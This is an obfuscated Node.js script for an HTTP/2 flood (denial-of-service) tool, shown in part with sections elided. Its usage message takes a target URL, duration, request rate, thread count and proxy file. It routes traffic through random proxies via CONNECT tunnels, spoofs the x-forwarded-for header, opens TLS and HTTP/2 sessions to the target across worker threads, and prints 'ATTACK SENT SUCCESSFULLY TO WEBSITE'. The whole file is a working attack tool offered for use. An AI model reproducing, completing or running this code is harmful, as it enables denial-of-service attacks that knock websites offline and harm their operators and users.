process.on("uncaughtException", function (_0x1e1592) {});
process.on("unhandledRejection", function (_0x28d63d) {});
process.on('SIGHUP', () => {
  return 0x1;
});
process.on("SIGCHILD", () => {
...
if (process.argv.length < 0x7) {
  console.log("Usage : node browser <url> <time> <requests> <threads> <proxyfile>\nExample : node browser https://example.com/ 100 100 10 proxy.txt");
  process.exit();
}
...
const headers = {};
function readLines(_0x15449e) {
  return fs.readFileSync(_0x15449e, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x43ab1d, _0x2db068) {
  return Math.floor(Math.random() * (_0x2db068 - _0x43ab1d) + _0x43ab1d);
}
function randomElement(_0x5f748f) {
  return _0x5f748f[Math.floor(Math.random() * (_0x5f748f.length - 0x0) + 0x0)];
}
function randomCharacters(_0x10291c) {
  output = '';
  for (let _0x5b5229 = 0x0; _0x5b5229 < _0x10291c; _0x5b5229++) {
...
if (cluster.isMaster) {
  ...
  console.log("\x1B[38;2;255;0;0m" + "Browser| ATTACK SENT SUCCESSFULLY TO WEBSITE... !! | MADE BY @TunChoiNgu".green);
...
class NetSocket {
  constructor() {}
  ["HTTP"](_0x45fa4e, _0x514547) {
    const _0x21e619 = 'CONNECT ' + _0x45fa4e.address + ":443 HTTP/1.1\r\nHost: " + _0x45fa4e.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x558da5 = new Buffer.from(_0x21e619);
    const _0x3bcc4c = net.connect({
      'host': _0x45fa4e.host,
      'port': _0x45fa4e.port,
      'allowHalfOpen': true,
      'writable': true,
    ...
    _0x3bcc4c.setTimeout(_0x45fa4e.timeout * 0x3e8);
    _0x3bcc4c.setKeepAlive(true, 0x2ee0);
    _0x3bcc4c.setNoDelay(true);
    _0x3bcc4c.on("connect", () => {
      _0x3bcc4c.write(_0x558da5);
    });
    _0x3bcc4c.on("data", _0x2d7e5a => {
      const _0x49137e = _0x2d7e5a.toString("utf-8");
      const _0x255865 = _0x49137e.includes('HTTP/1.1 200');
      if (_0x255865 === false) {
        _0x3bcc4c.destroy();
        return _0x514547(undefined, "403");
      }
      return _0x514547(_0x3bcc4c, undefined);
    });
    _0x3bcc4c.on("timeout", () => {
      _0x3bcc4c.destroy();
      return _0x514547(undefined, "403");
    });
    _0x3bcc4c.on("error", _0x189aeb => {
      _0x3bcc4c.destroy();
      return _0x514547(undefined, "403");
    });
  }
...
function runFlooder() {
  const _0x6e4eea = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x4d1483 = _0x6e4eea.split(':');
  headers[":authority"] = parsedTarget.host;
  headers['x-forwarded-for'] = _0x4d1483[0x0];
  ...
  Socker.HTTP(_0x2e2f12, (_0x14942c, _0x53c732) => {
    if (_0x53c732) {
      return;
    }
    _0x14942c.setKeepAlive(true, 0x15f90);
    _0x14942c.setNoDelay(true);
    const _0x4793ab = {
      'enablePush': false,
    ...
    const _0x5875a5 = tls.connect(0x1bb, parsedTarget.host, _0x187817);
    _0x5875a5.allowHalfOpen = true;
    _0x5875a5.setNoDelay(true);
    _0x5875a5.setKeepAlive(true, 3000000);
    _0x5875a5.setMaxListeners(0x0);
    const _0x3142d4 = http2.connect(parsedTarget.href, {
      'protocol': 'https:',
      'settings': {
    ...
    _0x3142d4.setMaxListeners(0x0);
    _0x3142d4.settings(_0x4793ab);
    _0x3142d4.on('connect', () => {});
    _0x3142d4.on("close", () => {
      _0x3142d4.destroy();
      _0x14942c.destroy();
      return;
    });
    _0x3142d4.on("error", _0x1237c0 => {
      _0x3142d4.destroy();
      _0x14942c.destroy();
      return;
    });
